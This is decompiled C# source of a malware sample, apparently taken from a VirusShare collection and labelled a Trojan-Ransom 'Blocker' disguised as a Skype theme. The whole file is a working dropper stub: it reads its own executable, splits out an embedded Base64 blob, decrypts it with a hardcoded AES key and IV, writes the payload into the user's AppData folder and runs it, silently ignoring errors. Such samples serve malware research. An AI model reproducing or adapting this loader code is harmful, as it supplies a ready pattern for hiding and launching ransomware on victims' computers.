// Decompiled with JetBrains decompiler
// Type: CorePad.CorePad
// Assembly: skype-Theme172.AKP, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E874C0F8-9D0D-44AC-A53C-5FFBE95C13A8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.alcm-2ef3ee4dc5366f7b7447fcda83902095db28f508496e6cac6d0d543ca35820bc.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;

namespace CorePad
{
  internal class CorePad
  {
    private static string Text;
    private static string appDat;
    private static string[] spl = new string[1]
    {
      "[L1OSilclouQwtm7CyMu4Dgo2rDAbq86BhbhmMFrTbs]"
    };
    private static string[] fName;
    private static byte[] fContentus;

    private static void Main(string[] args)
    {
      try
      {
        CorePad.CorePad.Text = CorePad.CorePad.SyFiRe();
        CorePad.CorePad.appDat = CorePad.CorePad.Folder();
        CorePad.CorePad.fName = CorePad.CorePad.TeSplit();
        CorePad.CorePad.fContentus = CorePad.CorePad.Fraps(Convert.FromBase64String(CorePad.CorePad.fName[1]));
        CorePad.CorePad.SyFi();
        CorePad.CorePad.SysDiProStart();
      }
      catch
      {
      }
    }

    private static bool SysDiProStart()
    {
      try
      {
        Process.Start(CorePad.CorePad.appDat + "\\" + CorePad.CorePad.fName[2]);
        return true;
      }
      catch
      {
        return false;
      }
    }

    private static bool SyFi()
    {
      try
      {
        File.WriteAllBytes(CorePad.CorePad.appDat + "\\" + CorePad.CorePad.fName[2], CorePad.CorePad.fContentus);
        return true;
      }
      catch
      {
        return false;
      }
    }

    private static string[] TeSplit()
    {
      try
      {
        return CorePad.CorePad.Text.Split(CorePad.CorePad.spl, StringSplitOptions.None);
      }
      catch
      {
        return new string[2]{ "x", "y" };
      }
    }

    private static byte[] Fraps(byte[] RdlKey)
    {
      try
      {
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        byte[] numArray1 = new byte[16]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8,
          (byte) 9,
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7
        };
        byte[] numArray2 = new byte[16]
        {
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1,
          (byte) 9,
          (byte) 8,
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1
        };
        rijndaelManaged.IV = numArray1;
        rijndaelManaged.Key = numArray2;
        return rijndaelManaged.CreateDecryptor().TransformFinalBlock(RdlKey, 0, RdlKey.Length);
      }
      catch
      {
        return (byte[]) null;
      }
    }

    private static string SyFiRe()
    {
      try
      {
        return File.ReadAllText(Process.GetCurrentProcess().MainModule.FileName);
      }
      catch
      {
        return "";
      }
    }

    private static string Folder()
    {
      try
      {
        return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      }
      catch
      {
        return "";
      }
    }

    private static string nullDom() => "XY";
  }
}
